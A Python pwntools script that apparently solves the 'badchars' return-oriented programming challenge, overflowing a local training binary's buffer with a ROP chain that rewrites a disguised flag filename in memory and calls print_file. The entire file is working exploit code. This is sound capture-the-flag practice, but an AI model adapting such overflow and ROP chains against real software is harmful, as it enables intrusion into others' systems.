#!/usr/bin/env python3
from pwn import p64, process, gdb, args, xor

if args.GDB:
    p = gdb.debug('./badchars', '''
    b *pwnme+268
    continue       
    ''')
else:
    p = process('./badchars')

flag = b'fl`f-twt'
address = p64(0x601030)
a_address, g_address, p_address, x_address = p64(0x601032), p64(0x601033), p64(0x601034), p64(0x601036)
call_print_file = p64(0x400620)
pop_all_reg = p64(0x40069c)
reg14 = b'\x01' * 8
pop_rdi = p64(0x4006a3)
pop_r15 = p64(0x4006a2)
mov_r12_r13 = p64(0x400634)
add_r15_r14 = p64(0x40062C)
print(g_address)

payload = b'A' * 40 + pop_all_reg + flag + address + reg14 + a_address + mov_r12_r13 + add_r15_r14 + pop_r15 + g_address + add_r15_r14 + pop_r15 + p_address + add_r15_r14 + pop_r15 + x_address + add_r15_r14 + pop_rdi + address + call_print_file
p.recvuntil(b'> ')
p.send(payload)
p.interactive()